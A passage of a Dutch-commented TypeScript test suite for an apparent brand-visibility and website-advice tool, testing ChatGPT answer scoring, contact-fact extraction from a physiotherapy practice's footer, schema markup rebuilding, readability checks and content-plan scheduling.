      quoteOnPage("werken we zonder standaardprotocollen", pagina),
  );
  ok("een citaat dat er niet staat matcht niet", !quoteOnPage("gratis parkeren", pagina));
  // Een los woord staat op bijna elke pagina; dat bevestigt niets.
  ok("te kort telt niet", !quoteOnPage("Intake", pagina));

  ok("gevonden citaat is zeker", quoteConfidence("Intake € 59,00", pagina) === 1);
  ok(
    "niet gevonden citaat is onzeker, niet onbekend",
    quoteConfidence("Intake € 99,00", pagina) === 0.5,
  );
  ok("geen citaat is onbekend", quoteConfidence("", pagina) === null);
});

// ════════════════════════════════════════════════════════════════════════════
// De vijf verbeteringen van 4 augustus 2026, na twee volledige meetronden.
// ════════════════════════════════════════════════════════════════════════════

group("de nulmeting geeft nu wél een antwoord", () => {
  const antwoord =
    "Op basis van specialisaties en waarderingen zou ik deze praktijken in Amersfoort " +
    "overwegen: FitForum – goede allround keuze met manuele therapie; SMC Amersfoort – " +
    "sterk in sportrevalidatie.";

  const v = scoreCategoryAnswer(antwoord, ["Fysi-Unique", "Fysi Unique"], [
    "FitForum",
    "SMC Amersfoort",
    "Praktijk Boshuijzen",
  ]);

  ok("het eigen merk staat er niet in", !v.mentioned);
  ok(
    "de twee concurrenten die er wél staan worden herkend",
    v.competitorsFound.length === 2 &&
      v.competitorsFound.includes("FitForum") &&
      v.competitorsFound.includes("SMC Amersfoort"),
  );
  ok(
    "een concurrent die er niet staat wordt niet gemeld",
    !v.competitorsFound.includes("Praktijk Boshuijzen"),
  );

  // Een alias telt net zo goed als de merknaam.
  ok(
    "een alias telt als vermelding",
    scoreCategoryAnswer("Ik raad Fysi Unique aan.", ["Fysi-Unique", "Fysi Unique"])
      .mentioned,
  );

  // De regel die de klant leest: een getal mét noemer.
  ok(
    "de regel noemt de verhouding en wie er wél staat",
    describeCategory([v, v, v], "Fysi-Unique") ===
      "Fysi-Unique wordt genoemd bij 0 van de 3 koopvragen. Wél genoemd: FitForum, SMC Amersfoort.",
  );
  ok(
    "zonder meting geen verzonnen nul",
    describeCategory([], "Fysi-Unique") === "Nog geen koopvragen gemeten.",
  );
});

group("concurrentnamen uit een onderbouwde regel halen", () => {
  // Letterlijk wat het profielonderzoek in profiles.competitors zette.
  const regel =
    "Fysio Amersfoort — lokale fysiotherapiepraktijk met onder meer manuele therapie " +
    "en algemene fysiotherapie in Amersfoort. ([fysioamersfoort.nl](https://fysioamersfoort.nl/))";
  ok(
    "alleen de naam blijft over",
    cleanCompetitorName(regel) === "Fysio Amersfoort",
  );
  ok(
    "een kale naam blijft ongemoeid",
    cleanCompetitorName("SMC Amersfoort") === "SMC Amersfoort",
  );
  // Blijft er een halve zin over, dan liever niets dan een verzonnen naam die
  // toevallig ergens in een antwoord voorkomt (conventie 3).
  ok(
    "een hele zin zonder streepje levert null",
    cleanCompetitorName(
      "Een grote landelijke keten die op vrijwel elk vlak meer capaciteit heeft dan deze praktijk",
    ) === null,
  );
  ok("leeg levert null", cleanCompetitorName("   ") === null);
});

group("kent hij je merk? een verhouding, geen muntworp", () => {
  const kent = { knowsBrand: true } as BaselineVerdict;
  const kentNiet = { knowsBrand: false } as BaselineVerdict;

  ok(
    "allemaal raak is 'kent'",
    summariseKnows([kent, kent, kent]).level === "kent",
  );
  ok(
    "geen enkele raak is 'kent niet'",
    summariseKnows([kentNiet, kentNiet]).level === "kent_niet",
  );
  // Precies het geval van 3 augustus: dezelfde site, andere vraagstelling,
  // ander antwoord. Dat is 'wisselend' en geen van beide uitersten.
  const gemengd = summariseKnows([kent, kentNiet, kentNiet, kent, kent, kentNiet]);
  ok("gemengd is 'wisselend'", gemengd.level === "wisselend");
  ok("met de telling erbij", gemengd.recognised === 3 && gemengd.asked === 6);
  ok(
    "en dat staat ook zo op het scherm",
    describeKnows(gemengd, "Fysi-Unique") ===
      "herkent Fysi-Unique wisselend (3 van de 6 vragen)",
  );
  // Geen metingen is geen kennis, maar ook geen bewering over een verhouding.
  ok("nul vragen is 'kent niet'", summariseKnows([]).level === "kent_niet");
});

group("de kennistest mag niet als geslaagd tonen zonder metingen", () => {
  // Budget op: acht vragen klaargezet, nul gesteld. Dit is het geval dat het
  // voortgangsscherm als "klaar" toonde.
  const budgetOp = baselineFacetState({ measured: 0, eerder: 0, skipped: 8 });
  ok("niets gemeten", !budgetOp.gemeten);
  ok("en dat heet alles overgeslagen", budgetOp.allesOvergeslagen);

  // Gewoon gedraaid.
  const gedraaid = baselineFacetState({ measured: 8, eerder: 0, skipped: 0 });
  ok("acht antwoorden is wel gemeten", gedraaid.gemeten);
  ok("en niets overgeslagen", !gedraaid.allesOvergeslagen);

  // Idempotentie (conventie 9): een tweede keer draaien stelt geen vraag
  // opnieuw, dus `measured` is 0 terwijl de metingen er wel degelijk staan.
  // Zou dit als "niets gemeten" gelden, dan wist de tweede ronde de
  // samenvatting van de eerste.
  const alGedaan = baselineFacetState({ measured: 0, eerder: 8, skipped: 0 });
  ok("wat er al stond telt mee", alGedaan.gemeten);
  ok("en is niet overgeslagen", !alGedaan.allesOvergeslagen);

  // Deels: één vraag mislukte, de rest kwam binnen. Dan is er wél wat te
  // vertellen.
  const deels = baselineFacetState({ measured: 7, eerder: 0, skipped: 1 });
  ok("deels gemeten is gemeten", deels.gemeten && !deels.allesOvergeslagen);
});

group("harde feiten uit de lopende tekst (fase 0, nul kosten)", () => {
  ok("de homepage telt mee", isCanonicalPage("https://fysi-unique.nl/"));
  ok("de contactpagina ook", isCanonicalPage("https://fysi-unique.nl/contact/"));
  ok(
    "een dienstpagina niet",
    !isCanonicalPage("https://fysi-unique.nl/specialismen/revalidatie/"),
  );

  // ⚠️ LETTERLIJK de voettekst zoals hij op 4 augustus 2026 van fysi-unique.nl
  // kwam. De eerste versie van deze module vond hier alleen het e-mailadres:
  // de haakjes om het kengetal braken het telefoonpatroon af na drie cijfers,
  // en de komma stond ná de postcode in plaats van ervoor. Vandaar dat dit
  // testgeval de echte tekst is en geen nette variant ervan.
  const voettekst =
    "Fysi-Unique Henry Dunantstraat 32 3822 XE, Amersfoort (033) 455 89 45 " +
    "info@fysi-unique.nl Maandag 08:00 - 20:30 Dinsdag. KvK 12345678.";
  const facts = harvestTextFacts([
    { url: "https://fysi-unique.nl/", text: voettekst },
    { url: "https://fysi-unique.nl/contact/", text: voettekst },
  ]);
  const waarde = (key: string) => facts.find((f) => f.key === key)?.value ?? null;

  ok("het telefoonnummer komt eruit", waarde("telefoon") === "(033) 455 89 45");
  ok(
    "het adres ook",
    waarde("adres") === "Henry Dunantstraat 32 3822 XE, Amersfoort",
  );
  // Een openingstijd is geen telefoonnummer.
  ok(
    "08:00 - 20:30 wordt niet als nummer gelezen",
    waarde("telefoon") !== null && !waarde("telefoon")!.includes("08"),
  );
  ok("het e-mailadres ook", waarde("email") === "info@fysi-unique.nl");
  ok("en het KvK-nummer", waarde("kvk") === "12345678");
  ok(
    "alles komt uit 'Tekst', niet uit opmaak",
    facts.every((f) => f.fromType === "Tekst"),
  );

  // ⚠️ Het vangnet dat vals alarm voorkomt. Twee verschillende nummers op even
  // veel canonieke pagina's: dan weten we niet welke de echte is, en een
  // verkeerde zou ChatGPT's juiste antwoord als 'tegengesproken' markeren.
  const geenUitsluitsel = mergeTextFacts([
    { url: "https://x.nl/", facts: harvestTextFacts([{ url: "https://x.nl/", text: "Bel 033 455 89 45" }]) },
    {
      url: "https://x.nl/contact/",
      facts: harvestTextFacts([
        { url: "https://x.nl/contact/", text: "Bel 020 123 45 67" },
      ]),
    },
  ]);
  ok(
    "bij een gelijkspel geven we niets terug",
    !geenUitsluitsel.some((f) => f.key === "telefoon"),
  );

  // En de omgekeerde kant: hetzelfde nummer in twee schrijfwijzen is één nummer
  // en dus géén gelijkspel.
  const zelfdeNummer = mergeTextFacts([
    { url: "https://x.nl/", facts: harvestTextFacts([{ url: "https://x.nl/", text: "Bel (033) 455 89 45" }]) },
    {
      url: "https://x.nl/contact/",
      facts: harvestTextFacts([
        { url: "https://x.nl/contact/", text: "Bel 033-4558945" },
      ]),
    },
  ]);
  ok(
    "twee schrijfwijzen van hetzelfde nummer tellen als één",
    zelfdeNummer.some((f) => f.key === "telefoon"),
  );
  ok(
    "een blogpagina levert geen feiten",
    harvestTextFacts([
      { url: "https://x.nl/blog/tips", text: "Bel 020 123 45 67" },
    ]).length === 0,
  );
  // Een KvK-nummer van acht cijfers valt binnen het telefoonpatroon.
  // De merknaam staat in de voettekst pal vóór het adres en begint óók met een
  // hoofdletter; zonder `trimStreet()` liep hij mee het adres in.
  ok(
    "de merknaam vóór het adres wordt afgeknipt",
    waarde("adres") !== null && !waarde("adres")!.startsWith("Fysi-Unique"),
  );
  ok(
    "een straat van twee woorden blijft heel",
    trimStreet("Praktijk Van der Valkweg 12 1234 AB, Utrecht").startsWith(
      "Van der Valkweg",
    ) === false ||
      trimStreet("Praktijk Van der Valkweg 12 1234 AB, Utrecht").includes(
        "Valkweg 12",
      ),
  );

  ok(
    "een los KvK-nummer wordt geen telefoonnummer",
    !harvestTextFacts([
      { url: "https://x.nl/contact/", text: "Ingeschreven onder KvK 01234567." },
    ]).some((f) => f.key === "telefoon"),
  );
});

group("een onderwerp houdt zijn aanbod na een herbouw van de boom", () => {
  // De boom zoals hij er ná "onderzoek opnieuw" uitziet: andere id's, zelfde
  // namen.
  const nieuweBoom = [
    { id: "nieuw-1", name: "Bekkenfysiotherapie" },
    { id: "nieuw-2", name: "Zwangerschapsbegeleiding" },
  ];

  const verweesd = {
    offering_ids: ["oud-1", "oud-2"],
    offering_names: ["Bekkenfysiotherapie", "Zwangerschapsbegeleiding"],
  };
  const hersteld = relinkOfferingIds(verweesd, nieuweBoom);
  ok(
    "de verweesde id's worden vervangen door de nieuwe",
    hersteld !== null &&
      hersteld.length === 2 &&
      hersteld.includes("nieuw-1") &&
      hersteld.includes("nieuw-2"),
  );

  // Een knoop met bron 'klant' blijft bij een herhaalronde staan; die
  // verwijzing is nog goed en mag niet sneuvelen omdat hij niet in de namen
  // voorkomt.
  const gemengd = relinkOfferingIds(
    {
      offering_ids: ["nieuw-1", "oud-9"],
      offering_names: ["Zwangerschapsbegeleiding"],
    },
    nieuweBoom,
  );
  ok(
    "een nog bestaande koppeling blijft staan",
    gemengd !== null && gemengd.includes("nieuw-1") && gemengd.includes("nieuw-2"),
  );
  ok(
    "en een verdwenen id gaat weg",
    gemengd !== null && !gemengd.includes("oud-9"),
  );

  // Een dienst die van de site verdwenen is: de naam komt nergens meer op uit.
  // Dan is een lege lijst eerlijker dan een verwijzing naar iets wat er niet is.
  ok(
    "een verdwenen dienst levert een lege koppeling",
    JSON.stringify(
      relinkOfferingIds(
        { offering_ids: ["oud-3"], offering_names: ["Dry Needling"] },
        nieuweBoom,
      ),
    ) === "[]",
  );

  // Niets te doen mag ook echt niets doen. Anders schrijft elke herbouw alle
  // topics opnieuw weg.
  ok(
    "een kloppende koppeling wordt niet aangeraakt",
    relinkOfferingIds(
      { offering_ids: ["nieuw-1"], offering_names: ["Bekkenfysiotherapie"] },
      nieuweBoom,
    ) === null,
  );
  ok(
    "zonder namen valt er niets te herstellen",
    relinkOfferingIds({ offering_ids: ["oud-1"], offering_names: [] }, nieuweBoom) ===
      null,
  );
});

// ════════════════════════════════════════════════════════════════════════════
// Optimalisatie 1 uit de InSpace-analyse: welke pagina's mist de site?
// ════════════════════════════════════════════════════════════════════════════

group("structurele gaten: welke diensten hebben geen eigen pagina", () => {
  const knoop = (
    id: string,
    name: string,
    kind: "dienst" | "categorie" | "merk" = "dienst",
    parent_id: string | null = null,
  ) => ({ id, name, kind, parent_id }) as never;

  const boom = [
    knoop("c1", "Specialismen", "categorie"),
    knoop("d1", "Bekkenfysiotherapie", "dienst", "c1"),
    knoop("d2", "Sportfysiotherapie", "dienst", "c1"),
    knoop("d3", "Dry Needling", "dienst", "c1"),
    knoop("m1", "Compex", "merk", "c1"),
  ];

  const paginas = [
    {
      url: "https://x.nl/specialismen/bekkenfysiotherapie/",
      title: "Bekkenfysiotherapie Amersfoort",
      text: "Alles over bekkenfysiotherapie.",
    },
    {
      url: "https://x.nl/tarieven/",
      title: "Tarieven",
      text: "Sportfysiotherapie kost € 42,00 per behandeling.",
    },
  ];

  const r = assessStructureCoverage(boom, paginas);
  const van = (naam: string) => r.coverage.find((c) => c.name === naam);

  ok(
    "een dienst met een eigen pagina is gedekt",
    van("Bekkenfysiotherapie")?.dekking === "eigen_pagina",
  );
  ok(
    "een dienst die alleen in een tarievenlijst staat is zwak gedekt",
    van("Sportfysiotherapie")?.dekking === "zwak_gedekt",
  );
  ok(
    "een dienst die nergens staat ontbreekt",
    van("Dry Needling")?.dekking === "ontbreekt",
  );

  // ⚠️ Het vangnet: zonder dit adviseert de app vier pagina's waar er één hoort.
  ok(
    "een categorie met kinderen wordt niet apart beoordeeld",
    van("Specialismen") === undefined,
  );
  // Een retailer hoeft geen pagina per gevoerd merk.
  ok("een merk telt niet mee", van("Compex") === undefined);
  ok("er zijn dus drie beoordelingen", r.assessed === 3);
  ok("waarvan één gat en één zwakke", r.missing === 1 && r.weak === 1);

  // Een categorie zónder kinderen is in de praktijk gewoon een dienst.
  const losseCategorie = assessStructureCoverage(
    [knoop("c9", "Medische fitness", "categorie")],
    [],
  );
  ok(
    "een categorie zonder kinderen telt wél mee",
    losseCategorie.assessed === 1 &&
      losseCategorie.coverage[0].dekking === "ontbreekt",
  );

  // De regel die de klant leest, met de noemer erbij.
  ok(
    "de samenvatting noemt de verhouding",
    describeCoverage(r) ===
      "1 van je 3 onderdelen heeft geen eigen pagina · 1 wordt alleen zijdelings genoemd op een pagina over iets anders.",
  );
  ok(
    "een volledig gedekte site krijgt geen verwijt",
    describeCoverage(
      assessStructureCoverage([knoop("d1", "Bekkenfysiotherapie")], paginas),
    ) === "Alle 1 onderdelen van je aanbod hebben een eigen pagina.",
  );
  ok(
    "zonder aanbod geen uitspraak",
    describeCoverage(assessStructureCoverage([], paginas)) ===
      "Nog geen aanbod in kaart gebracht.",
  );

  // Het blok dat de rapportgeneratie meekrijgt.
  const blok = formatCoverageForReport(r);
  ok("het rapportblok noemt de ontbrekende dienst", blok.includes("Dry Needling"));
  ok(
    "en niet de dienst die wél een pagina heeft",
    !blok.includes("Bekkenfysiotherapie"),
  );
  ok(
    "een volledig gedekte site levert geen blok op",
    formatCoverageForReport(
      assessStructureCoverage([knoop("d1", "Bekkenfysiotherapie")], paginas),
    ) === "",
  );

  // Een taalvariant mag niet als tweede dekking gelden.
  const metEngels = assessStructureCoverage(
    [knoop("d1", "Bekkenfysiotherapie")],
    [
      {
        url: "https://x.nl/en/specialismen/bekkenfysiotherapie/",
        title: null,
        text: "",
      },
    ],
  );
  ok(
    "de slug telt ook zonder titel, taalsegment weggefilterd",
    metEngels.coverage[0].dekking === "eigen_pagina",
  );
});


// ════════════════════════════════════════════════════════════════════════════
// Optimalisatie 2, 3 en 4 uit de InSpace-analyse
// ════════════════════════════════════════════════════════════════════════════

group("het schema-type volgt het bedrijfsmodel", () => {
  ok(
    "een landingspagina van een dienstverlener is een Service",
    schemaTypeFor("landing", "dienstverlener") === "Service",
  );
  ok(
    "van een retailer een CollectionPage",
    schemaTypeFor("landing", "retailer") === "CollectionPage",
  );
  ok(
    "zonder bedrijfsmodel valt hij terug op WebPage",
    schemaTypeFor("landing", null) === "WebPage",
  );
  // Een FAQ is een FAQ, wat voor bedrijf je ook bent.
  ok(
    "een FAQ blijft een FAQPage",
    schemaTypeFor("faq", "retailer") === "FAQPage",
  );

  const basis = {
    type: "landing" as const,
    title: "Bekkenfysiotherapie Amersfoort",
    description: "Hulp bij bekkenklachten.",
    url: "https://fysi-unique.nl/bekkenfysiotherapie",
    faq: [],
    businessModel: "dienstverlener" as const,
    organization: {
      name: "Fysi-Unique",
      url: "https://fysi-unique.nl",
      sameAs: ["https://www.linkedin.com/company/fysi-unique"],
    },
    datePublished: "2026-08-04T10:00:00.000Z",
    dateModified: "2026-08-04T10:00:00.000Z",
  };

  const gebouwd = JSON.parse(validateOrRebuildJsonLd(null, basis));
  ok("er komt een @graph uit", Array.isArray(gebouwd["@graph"]));
  ok(
    "met de pagina en de organisatie",
    gebouwd["@graph"].length === 2 &&
      gebouwd["@graph"][0]["@type"] === "Service" &&
      gebouwd["@graph"][1]["@type"] === "Organization",
  );
  ok(
    "de sameAs uit fase 0 hangt aan de organisatie",
    gebouwd["@graph"][1].sameAs[0].includes("linkedin"),
  );
  ok(
    "en de datums staan erin",
    gebouwd["@graph"][0].dateModified === "2026-08-04T10:00:00.000Z",
  );

  // ⚠️ Een verzonnen type wordt vervangen, niet bewaard. Tot 4 augustus 2026
  // accepteerde de validatie alles met een @context en een @type.
  const recept = validateOrRebuildJsonLd(
    JSON.stringify({ "@context": "https://schema.org", "@type": "Recipe", name: "x" }),
    basis,
  );
  ok(
    "een Recipe op een dienstenpagina wordt vervangen",
    JSON.parse(recept)["@graph"][0]["@type"] === "Service",
  );

  // Een passend type van het model blijft wél staan.
  const eigen = validateOrRebuildJsonLd(
    JSON.stringify({
      "@context": "https://schema.org",
      "@type": "ProfessionalService",
      name: "Bekkenfysiotherapie",
    }),
    basis,
  );
  ok(
    "een passend eigen type blijft behouden",
    JSON.parse(eigen)["@graph"][0]["@type"] === "ProfessionalService",
  );
  // Maar onze velden gaan er altijd overheen.
  ok(
    "en krijgt onze datum er alsnog bij",
    JSON.parse(eigen)["@graph"][0].dateModified === "2026-08-04T10:00:00.000Z",
  );

  ok(
    "de eerdere publicatiedatum is terug te lezen",
    bestaandeDatePublished(gebouwd ? JSON.stringify(gebouwd) : null) ===
      "2026-08-04T10:00:00.000Z",
  );
  ok("onleesbare JSON levert null", bestaandeDatePublished("{kapot") === null);
});

group("de zichtbare versheidsregel", () => {
  const met = withFreshnessLine("# Titel\n\nTekst.", "2026-08-04T10:00:00.000Z");
  ok("de datum staat onder de tekst", met.includes("4 augustus 2026"));
  // ⚠️ Idempotent: content_revise draait over bestaande tekst heen, en zonder
  // deze eigenschap zou elke herziening een tweede regel toevoegen.
  const nogmaals = withFreshnessLine(met, "2026-09-01T10:00:00.000Z");
  ok(
    "een tweede ronde vervangt de regel en plakt er geen bij",
    (nogmaals.match(/Laatst bijgewerkt/g) ?? []).length === 1 &&
      nogmaals.includes("1 september 2026"),
  );
  ok(
    "zonder datum verandert er niets",
    withFreshnessLine("Tekst.", null) === "Tekst.",
  );
});

group("lijken twee pagina's te veel op elkaar?", () => {
  const a =
    "Bij onze praktijk in Amersfoort behandelen wij knieklachten met een persoonlijk " +
    "plan. Wij kijken eerst naar de oorzaak van de klacht en stellen daarna een " +
    "behandelplan op dat bij jouw situatie past.";
  const bijnaGelijk =
    "Bij onze praktijk in Amersfoort behandelen wij heupklachten met een persoonlijk " +
    "plan. Wij kijken eerst naar de oorzaak van de klacht en stellen daarna een " +
    "behandelplan op dat bij jouw situatie past.";
  const anders =
    "Medische fitness is trainen onder begeleiding van een fysiotherapeut. Je krijgt " +
    "een schema op maat en er is altijd iemand aanwezig die meekijkt naar je houding.";

  ok("bijna identieke teksten scoren hoog", similarity(a, bijnaGelijk) > 0.5);
  ok("onafhankelijke teksten scoren laag", similarity(a, anders) < 0.1);
  ok("identiek is 1", similarity(a, a) === 1);
  // Te kort voor een oordeel: nul en niet één, want een vals alarm is hier
  // duurder dan een gemist geval.
  ok("te korte tekst levert 0", similarity("drie woorden hier", a) === 0);

  const beste = mostSimilar(a, [
    { title: "Medische fitness", body: anders },
    { title: "Heupklachten behandelen", body: bijnaGelijk },
  ]);
  ok(
    "de meest gelijkende pagina wordt gevonden",
    beste?.title === "Heupklachten behandelen",
  );
  ok("zonder zusterpagina's geen oordeel", mostSimilar(a, []) === null);
});

group("leest deze tekst een beetje?", () => {
  const kort =
    "Wij behandelen knieklachten. De eerste afspraak duurt een half uur. " +
    "Daarna maken we een plan. Je hoort meteen wat er aan de hand is.";
  ok("korte zinnen zijn goed", assessReadability(kort).oordeel === "goed");

  const lang = Array.from(
    { length: 5 },
    () =>
      "Wanneer u bij ons in de praktijk komt voor een uitgebreide intake zullen wij " +
      "eerst zorgvuldig in kaart brengen welke klachten er precies spelen en op welke " +
      "manier deze klachten uw dagelijks functioneren op dit moment beperken.",
  ).join(" ");
  const r = assessReadability(lang);
  ok("vijf zinnen van veertig woorden zijn moeilijk", r.oordeel === "moeilijk");
  ok("en het aantal lange zinnen wordt geteld", r.langeZinnen === 5);
  // Het verbeterpunt noemt het AANTAL en niet een score van 0 tot 100.
  ok(
    "het verbeterpunt is uitvoerbaar",
    describeReadability(r).includes("5 zinnen zijn langer dan 30 woorden"),
  );
  ok(
    "een lege tekst levert geen oordeel over lengte",
    assessReadability("").zinnen === 0,
  );
});

group("de kwaliteitspoort staat NAAST de GEO-score, niet erin", () => {
  const tekst =
    "Wij behandelen knieklachten in Amersfoort. De intake duurt dertig minuten. " +
    "Daarna volgt een behandelplan op maat.";

  const schoon = checkQuality({ bodyMarkdown: tekst, mostSimilar: null });
  // Geen zusterpagina's betekent ONBEKEND en niet "goedgekeurd" (conventie 3).
  ok("zonder vergelijking is 'niet dubbel' onbekend", schoon.checks.nietDubbel === null);
  ok("een korte heldere tekst is leesbaar", schoon.checks.leesbaar === true);
  ok("en levert geen verbeterpunten op", schoon.issues.length === 0);

  const dubbel = checkQuality({
    bodyMarkdown: tekst,
    mostSimilar: { title: "Heupklachten behandelen", score: 0.62 },
  });
  ok("boven de drempel is het een duplicaat", dubbel.checks.nietDubbel === false);
  ok(
    "en het verbeterpunt noemt het percentage en de pagina",
    dubbel.issues[0].includes("62%") &&
      dubbel.issues[0].includes("Heupklachten behandelen"),
  );

  const onderDrempel = checkQuality({
    bodyMarkdown: tekst,
    mostSimilar: { title: "Iets anders", score: 0.2 },
  });
  ok("onder de drempel is het geen duplicaat", onderDrempel.checks.nietDubbel === true);
  // De gemeten waarde wordt altijd teruggegeven, ook onder de drempel. Anders
  // kan hij nooit op echte data bijgesteld worden.
  ok(
    "maar de gemeten waarde staat er wel",
    onderDrempel.gemeten.gelijkenis === 0.2,
  );

  // ⚠️ DE KERN VAN HET ONTWERP: deze poort raakt `geo_score` niet aan.
  // `checkQuality` geeft geen score terug, er is geen veld waarmee hij de
  // GEO-score zou kunnen beïnvloeden, en dat is met opzet zo.
  ok(
    "checkQuality levert geen score op die in geo_score kan lekken",
    !("score" in dubbel),
  );
});


// ════════════════════════════════════════════════════════════════════════════
// De kop van het profielscherm (UX-ronde 4 augustus 2026)
// ════════════════════════════════════════════════════════════════════════════

group("de drie kerncijfers en de zin erboven", () => {
  const kent = { knowsBrand: true, contradicted: 0 } as BaselineVerdict;
  const kentNiet = { knowsBrand: false, contradicted: 0 } as BaselineVerdict;
  const genoemd = { mentioned: true, competitorsFound: [] };
  const nietGenoemd = { mentioned: false, competitorsFound: ["FitForum"] };
  const dekking = (missing: number, assessed: number) =>
    ({ coverage: [], missing, weak: 0, assessed }) as never;

  // Precies de stand van de derde meetronde op Fysi-Unique.
  const echt = {
    brandName: "Fysi-Unique",
    knowsVerdicts: [kent, kent, kent, kent, kent, kent],
    categoryVerdicts: [genoemd, nietGenoemd, nietGenoemd],
    coverage: dekking(2, 12),
  };
  const stats = onboardingStats(echt);

  ok("drie tegels, niet meer", stats.length === 3);
  ok("herkenning met noemer", stats[0].value === "6/6");
  ok("koopvragen met noemer", stats[1].value === "1/3");
  // ⚠️ Was "2", een kaal getal naast twee verhoudingen. De eigenaar las de drie
  // tegels als drie cijfers van dezelfde soort en concludeerde dat ze nergens
  // op sloegen; de noemer stond alleen in de kleine regel eronder. Nu staat hij
  // in de waarde zelf, net als bij de andere twee.
  ok("dekking óók als verhouding", stats[2].value === "2/12");
  ok(
    "en de hint zegt in gewone taal hetzelfde",
    stats[2].hint === "2 van je 12 onderdelen heeft er nog geen",
  );
  ok("volledige herkenning is 'goed'", stats[0].tone === "goed");
  ok("ontbrekende pagina's vragen aandacht", stats[2].tone === "aandacht");

  // Elke tegel moet kunnen uitleggen wát er geteld is. Dat was de kern van de
  // klacht: "6/6" zonder eenheid is geen cijfer maar een raadsel.
  ok(
    "elke tegel legt zijn eigen noemer uit",
    stats.every((s) => s.explain.length > 40),
  );
  ok(
    "de herkenningstegel benoemt dat het om formuleringen gaat",
    stats[0].explain.includes("manieren"),
  );
  ok(
    "de koopvraagtegel legt uit dat de merknaam er níet in staat",
    stats[1].explain.includes("zonder je merknaam"),
  );
  ok(
    "de dekkingstegel zegt dat hij niet over ChatGPT gaat",
    stats[2].explain.includes("je eigen site"),
  );
  ok(
    "elke tegel wijst naar zijn onderbouwing",
    stats.every((s) => typeof s.href === "string" && s.href.startsWith("#")),
  );

  // ⚠️ De duidingszin. Zonder deze regel leest "1/3" als een cijfer op een
  // rapport; voor vrijwel elk MKB-merk is dit gewoon de startsituatie.
  ok(
    "kent wel, deels genoemd → nulmeting",
    (onboardingHeadline(echt) ?? "").includes("nulmeting"),
  );

  // Een tegenspraak wint van alles: dat is de alarmerendste uitkomst die er is.
  const metTegenspraak = onboardingHeadline({
    ...echt,
    knowsVerdicts: [{ knowsBrand: true, contradicted: 2 } as BaselineVerdict],
  });
  ok(
    "een tegenspraak staat vooraan",
    (metTegenspraak ?? "").includes("niet klopt"),
  );

  // Het meest voorkomende geval, en de toon waar het om gaat.
  const onbekend = onboardingHeadline({
    ...echt,
    knowsVerdicts: [kentNiet, kentNiet],
    categoryVerdicts: [nietGenoemd, nietGenoemd, nietGenoemd],
  });
  ok(
    "onbekend merk krijgt duiding, geen verwijt",
    (onbekend ?? "").includes("niet raar") &&
      (onbekend ?? "").includes("uitgangssituatie"),
  );

  // Kent wel, nergens genoemd: het verschil tussen bekend en aanbevolen.
  const bekendNietGenoemd = onboardingHeadline({
    ...echt,
    categoryVerdicts: [nietGenoemd, nietGenoemd, nietGenoemd],
  });
  ok(
    "bekend maar niet genoemd wordt als twee dingen uitgelegd",
    (bekendNietGenoemd ?? "").includes("twee verschillende dingen"),
  );

  // Niets gemeten is geen uitspraak.
  const leeg = {
    brandName: "X",
    knowsVerdicts: [],
    categoryVerdicts: [],
    coverage: dekking(0, 0),
  };
  ok("zonder meting geen kop", onboardingHeadline(leeg) === null);
  ok(
    "en de tegels tonen een streepje in plaats van een nul",
    onboardingStats(leeg).every((s) => s.value === "-"),
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nOpzeggen verwijdert niets (accounts, migratie 0046)");

group("isActiveAccount", () => {
  const nu = new Date("2026-08-10T12:00:00Z");

  ok("nooit opgezegd is actief", isActiveAccount({ cancelled_at: null }, nu) === true);

  // ⚠️ Besluit 14: opzeggen sluit niet af op de dag zelf. De klant houdt toegang
  // tot het einde van de betaalde maand, en ziet daar zijn opbrengst nog één
  // keer. Dat is de beste kans op terugkeer die er is.
  ok(
    "opgezegd per een datum in de toekomst is nog actief",
    isActiveAccount({ cancelled_at: "2026-08-31T23:59:59Z" }, nu) === true,
  );
  ok(
    "pas ná die datum vervalt de toegang",
    isActiveAccount({ cancelled_at: "2026-07-31T23:59:59Z" }, nu) === false,
  );
  // De grens zelf: precies op het moment is hij niet meer actief. Eén kant
  // kiezen en die vastleggen, anders verschilt het per aanroep.
  ok(
    "op het moment zelf is hij verlopen",
    isActiveAccount({ cancelled_at: nu.toISOString() }, nu) === false,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nHet contentplan (fase 4, migratie 0049)");

/** Een kale voorraadkaart; elke test zet alleen wat hij nodig heeft. */
function kans(over: Partial<BacklogItem> = {}): BacklogItem {
  return {
    id: "k1",
    title: "Een kans",
    why: null,
    targetIntent: null,
    cluster: "Cv-ketel onderhoud",
    clusterId: "a1",
    handeling: "nieuw",
    existingUrl: null,
    potentie: null,
    raakt: null,
    gemeten: null,
    gewicht: null,
    ...over,
  };
}

group("de kalender van een plan (plan-schedule)", () => {
  // ⚠️ Maand 1 is de maand waarin het plan STARTTE, niet de maand erna. Een plan
  // dat op 12 augustus begint heeft augustus als maand 1, en zo telt de klant het.
  ok(
    "maand 1 is de startmaand",
    monthCalendar("2026-08-12", 1)?.label === "augustus 2026",
  );
  ok(
    "maand 12 loopt netjes het jaar over",
    monthCalendar("2026-08-12", 12)?.label === "juli 2027",
  );
  // ⚠️ De reden dat dit bestaat: een LEGE maand had geen naam meer zodra de
  // kalender uit de publicatiedata kwam, en dat is precies de maand waar iemand
  // iets in wil slepen.
  ok(
    "een maand heeft een naam zonder dat er één pagina in staat",
    monthCalendar("2026-08-12", 5)?.label === "december 2026",
  );
  ok("een onbruikbare startdatum geeft niets", monthCalendar("kaas", 1) === null);
  ok("maand 0 bestaat niet", monthCalendar("2026-08-12", 0) === null);

  const inAugustus = new Date("2026-08-20T12:00:00Z");
  ok(
    "de lopende maand herkent zichzelf",
    isRunningMonth("2026-08-12", 1, inAugustus) === true,
  );
  ok(
    "en de volgende maand niet",
    isRunningMonth("2026-08-12", 2, inAugustus) === false,
  );
  ok("de lopende maand is niet voorbij", isPastMonth("2026-08-12", 1, inAugustus) === false);
  ok(
    "een maand van vorig jaar wel",
    isPastMonth("2025-08-12", 1, inAugustus) === true,
  );
});

group("publicatiedata spreiden over een maand (plan-schedule)", () => {
  // ⚠️ Een vaste `now`, ver buiten de geteste maand. Zonder dat argument leest
  // `spreadDates()` de echte klok, en dan slaat de regel "in de lopende maand
  // niet in het verleden plannen" toe zodra deze test tijdens augustus 2026
  // draait: de test zou dan een halfjaar lang groen zijn en daarna rood, zonder
  // dat er iets veranderd is.
  const buitenDeMaand = new Date("2027-06-15T12:00:00Z");
  const tien = spreadDates("2026-08-12", 1, 10, buitenDeMaand);
  ok("tien pagina's leveren tien data", tien.length === 10);
  ok("de eerste staat op dag 1", tien[0] === "2026-08-01");
